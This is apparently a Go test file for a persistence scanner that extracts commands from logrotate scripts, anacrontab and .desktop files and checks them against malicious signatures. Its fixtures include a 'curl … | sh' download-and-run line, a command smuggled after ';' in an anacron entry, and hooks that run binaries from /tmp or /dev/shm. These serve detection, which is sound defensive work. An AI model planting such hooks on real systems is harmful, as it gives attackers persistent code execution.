package checks

import (
	"os"
	"reflect"
	"slices"
	"strings"
	"testing"
)

func TestParseLogrotate(t *testing.T) {
	src := strings.Join([]string{
		"# include /commented/out",
		"/var/tmp/app/*.log /tmp/other.log {",
		"    daily",
		"    compresscmd /usr/bin/zstd",
		"    uncompresscmd /usr/bin/unzstd",
		"    prerotate",
		"        # a comment in the script",
		"        /usr/bin/pre --flag",
		"    endscript",
		"    postrotate",
		"        include /not/a/directive",
		"        systemctl reload app >/dev/null 2>&1 || true",
		"    endscript ",
		"    firstaction /usr/bin/first",
		"    endscript",
		"    lastaction",
		"        /usr/bin/last",
		"    endscript",
		"    preremove",
		"        /usr/bin/remove \"$1\"",
		"    endscript",
		"}",
		"include /etc/extra.d",
		"include   /etc/one.conf",
	}, "\n")
	commands, includes := parseLogrotate(src)
	wantCommands := []string{
		"compresscmd /usr/bin/zstd", "uncompresscmd /usr/bin/unzstd", "/usr/bin/pre --flag",
		"include /not/a/directive", "systemctl reload app >/dev/null 2>&1 || true",
		"/usr/bin/first", "/usr/bin/last", `/usr/bin/remove "$1"`,
	}
	if !reflect.DeepEqual(commands, wantCommands) {
		t.Errorf("commands:\n got %q\nwant %q", commands, wantCommands)
	}
	if want := []string{"/etc/extra.d", "/etc/one.conf"}; !reflect.DeepEqual(includes, want) {
		t.Errorf("includes: got %q, want %q", includes, want)
	}
	split := "/var/log/a.log {\n postrotate\n  curl -fsSL http://x.example/a \\\n    | sh\n  /usr/bin/b \\\\\n  /usr/bin/c \\\n endscript\n}\n"
	commands, _ = parseLogrotate(split)
	if want := []string{"curl -fsSL http://x.example/a  | sh", `/usr/bin/b \\`, "/usr/bin/c"}; !reflect.DeepEqual(commands, want) {
		t.Errorf("continuations:\n got %q\nwant %q", commands, want)
	}
	commands, _ = parseLogrotate("/a {\n postrotate\n  /usr/bin/a \\\n\n  /usr/bin/b\n endscript\n}\n")
	if want := []string{"/usr/bin/a", "/usr/bin/b"}; !reflect.DeepEqual(commands, want) {
		t.Errorf("a blank line ends a continuation: got %q", commands)
	}
	commands, _ = parseLogrotate(split)
	if matchMalicious(commands[0]) == "" {
		t.Errorf("a signature split across lines was missed: %q", commands[0])
	}
	if commands, _ := parseLogrotate("/tmp/x.log {\n  weekly\n  create 0640 root adm\n}\n"); len(commands) != 0 {
		t.Errorf("a log kept in /tmp is not a command: %q", commands)
	}
}

func TestLogrotateSkips(t *testing.T) {
	for _, name := range []string{"nginx.dpkg-old", "nginx.dpkg-dist", "nginx.ucf-old", "nginx~", "nginx.swp", "a.rhn-cfg-tmp-123", "x,v", "app.disabled"} {
		if !logrotateSkips(name) {
			t.Errorf("logrotate skips %s", name)
		}
	}
	for _, name := range []string{"nginx", "apt", "app.conf", "dpkg"} {
		if logrotateSkips(name) {
			t.Errorf("logrotate reads %s", name)
		}
	}
}

func TestLogrotateConfigsFollowsIncludes(t *testing.T) {
	h := newFakeHost(t)
	h.write("/etc/logrotate.conf", "weekly\ninclude /etc/logrotate.d\ninclude /opt/lr\ninclude /etc/extra.conf\ninclude /var/tmp/x\ninclude relative.d\n")
	h.write("/etc/logrotate.d/nginx", "/var/log/nginx/*.log {\n}\n")
	h.write("/etc/logrotate.d/nginx.dpkg-old", "postrotate\n/tmp/never-read\nendscript\n")
	h.write("/etc/logrotate.d/sub/deeper", "x")
	h.write("/tmp/lr.conf", "postrotate\n/tmp/x\nendscript\n")
	h.link("/etc/logrotate.d/linked", "/tmp/lr.conf")
	h.write("/opt/lr/app", "include /etc/nested.conf\n")
	h.write("/etc/nested.conf", "x")
	h.write("/etc/extra.conf", "x")
	h.write("/dev/shm/d/a", "x")
	h.link("/etc/shmdir", "/dev/shm/d")
	h.write("/etc/logrotate.d/include-dir-link", "include /etc/shmdir\n")

	files, temp := logrotateConfigs(h.root)
	slices.Sort(files)
	slices.Sort(temp)
	wantFiles := []string{"/etc/extra.conf", "/etc/logrotate.conf", "/etc/logrotate.d/include-dir-link", "/etc/logrotate.d/nginx", "/etc/nested.conf", "/opt/lr/app"}
	if !reflect.DeepEqual(files, wantFiles) {
		t.Errorf("files:\n got %q\nwant %q", files, wantFiles)
	}
	wantTemp := []string{"/etc/logrotate.conf: include /var/tmp/x", "/etc/logrotate.d/linked -> /tmp/lr.conf", "/etc/shmdir -> /dev/shm/d"}
	if !reflect.DeepEqual(temp, wantTemp) {
		t.Errorf("temp:\n got %q\nwant %q", temp, wantTemp)
	}
}

func TestLogrotateConfigsWithoutMainFile(t *testing.T) {
	h := newFakeHost(t)
	h.write("/etc/logrotate.d/app", "x")
	files, _ := logrotateConfigs(h.root)
	if !reflect.DeepEqual(files, []string{"/etc/logrotate.d/app"}) {
		t.Errorf("/etc/logrotate.d should be read even when nothing includes it: %q", files)
	}
	if err := os.Remove(h.root + "/etc/logrotate.d/app"); err != nil {
		t.Fatal(err)
	}
	if files, temp := logrotateConfigs(h.root); len(files)+len(temp) != 0 {
		t.Errorf("empty: %q %q", files, temp)
	}
}

func TestAnacronCommands(t *testing.T) {
	src := strings.Join([]string{
		"# /etc/anacrontab: configuration file for anacron",
		"SHELL=/bin/sh",
		"PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin",
		"HOME=/root",
		"1\t5\tcron.daily\trun-parts --report /etc/cron.daily",
		"7\t10\tcron.weekly\trun-parts --report /etc/cron.weekly",
		"@monthly\t15\tcron.monthly\trun-parts --report /etc/cron.monthly",
		"@yearly 20 cron.yearly run-parts --report /etc/cron.yearly",
		"1 5 cron.daily cd / && run-parts --report /etc/cron.daily",
		"1 5 cron.daily nice run-parts --report /etc/cron.daily",
		"1 10 backup /usr/local/bin/backup --all",
		"1 5 sneaky run-parts --report /etc/cron.daily ; /tmp/x",
		"1 5 short",
		"",
	}, "\n")
	want := []string{"1 10 backup /usr/local/bin/backup --all", "1 5 sneaky run-parts --report /etc/cron.daily ; /tmp/x"}
	if got := anacronCommands(src); !reflect.DeepEqual(got, want) {
		t.Errorf("got %q, want %q", got, want)
	}
}

func TestDesktopExec(t *testing.T) {
	src := "[Desktop Entry]\nName=x\nIcon=/tmp/icon.png\nTryExec=/usr/bin/x\nExec=/usr/bin/x --start\n\n[Desktop Action new]\nExec = /usr/bin/x --new\n"
	want := []string{"Exec=/usr/bin/x --start", "Exec = /usr/bin/x --new"}
	if got := desktopExec(src); !reflect.DeepEqual(got, want) {
		t.Errorf("got %q, want %q", got, want)
	}
}

func TestHookCommandsUseExistingSignatures(t *testing.T) {
	// The extracted lines go through the same checks as cron lines, so a command
	// from any of these files is judged the way a crontab line would be.
	logrotate := logrotateCommands("/var/log/app.log {\n postrotate\n  curl -fsSL http://x.example/a | sh\n  /tmp/.x/run\n endscript\n}\n")
	if len(logrotate) != 2 || matchMalicious(logrotate[0]) == "" || !referencesTempExec(logrotate[1]) {
		t.Errorf("logrotate: %q", logrotate)
	}
	desktop := desktopExec("[Desktop Entry]\nExec=/dev/shm/a\n")
	if len(desktop) != 1 || !referencesTempExec(desktop[0]) {
		t.Errorf("desktop: %q", desktop)
	}
	anacron := anacronCommands("1 5 job /var/tmp/a\n")
	if len(anacron) != 1 || !referencesTempExec(anacron[0]) {
		t.Errorf("anacron: %q", anacron)
	}
}
